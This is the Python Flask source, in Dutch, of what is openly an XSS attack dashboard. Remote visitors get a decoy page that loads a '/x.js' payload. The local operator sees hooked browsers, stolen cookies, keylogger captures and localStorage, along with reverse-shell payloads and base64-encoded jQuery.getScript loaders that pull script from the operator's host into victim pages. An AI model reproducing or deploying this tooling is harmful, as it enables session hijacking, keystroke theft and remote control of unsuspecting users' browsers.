from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response
from meuk.flask.models import *
import glob
import base64


appdata = db_instellingen.query.first()

@app.template_filter('zet_actief')
def zet_actief(tab, pag):
    if pag == 'verwerkt':
        if tab == 'tab1':
            return 'in active'
    else:
        if pag !='verwerkt':
            if tab == 'tab0':
                return 'in active'
    return ''

@app.template_filter('nulvul')
def nulvul(num):
    return str(num).zfill(3)


@app.template_filter('zet_pill')
def zet_pill(tab, pag):
    if pag == 'verwerkt':
        if tab == 'tab1':
            return 'class="active"'
    else:
        if pag !='verwerkt':
            if tab == 'tab0':
                return 'class="active"'
    return ''

@app.template_filter('bevindingen_halen')
def bevindingen_halen(num, b):
   
    d=''
    for x in b:
        if int(x.ref) == num:
            d = d + '<li id="finding_'+str(x.id)+'"><a href="#" class="modalweergeven" data-title="'+x.naam+'" data-rel="/dashboard/findings/edit/'+str(x.id)+'">['+str(x.id).zfill(3)+']  <strong>'+x.naam+'</strong></a>    <small class="delete_finding pull-right label-danger" data-item="finding_'+str(x.id)+'" data-rel="'+str(x.id)+'">[instant delete]</small></li>'
    return d


# Blueprint Configuration
index_bp = Blueprint('index_bp', __name__,
                    template_folder='html',
                    static_folder='static')


#basic website
@index_bp.route('/', defaults={'cms_pag': 'index'}, methods=['GET', 'POST'])
@index_bp.route('/<cms_pag>')
def index(cms_pag):
    ip = request.remote_addr
    if ip != '127.0.0.1':

        #setup our payload delivery

        #is payload accepted
        

        return '<html><title>hallo wereld</title><body><h1>Een moment a.u.b.</h1><script src="/x.js"></script></body></html>'

    else:
        #use our normal pages
        hooked = db_xxs_hooked.query.all()
        cookies = db_xxs_cookies.query.order_by('datum').all()
        keylogger = db_xxs_keylogger.query.order_by('datum').all()
        localstorage=db_xxs_localstorage.query.order_by('datum').all()
        template = db_bevindingen_templates.query.all()
        bevindingen = db_bevindingen.query.all()

        shells=lezen('http/payloads/shell_443.txt')
        d="jQuery.getScript('"+appdata.localhost+"/x.js');"
        js1=base64.b64encode(bytes(d, 'utf-8'))
        js1 = str(js1, 'utf-8')
        jspagina = render_template('xss.html', localhost=appdata.localhost)
        js2=base64.b64encode(bytes(jspagina, 'utf-8'))
        js2 = str(js2, 'utf-8')

        #overzichtweergeven
        pagina = render_template('dashboard.html', cms_pag=cms_pag, bevindingen=bevindingen, cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked), template=template, shells=shells, quotes=quotes(), js1=js1, js2=js2, appdata=appdata)
        return pagina

#favicon
@index_bp.route('/favicon.ico')
@index_bp.route('/static/favicon.ico')
def favicon():
    pagina =  send_from_directory('favicon.ico')
    return str(pagina)


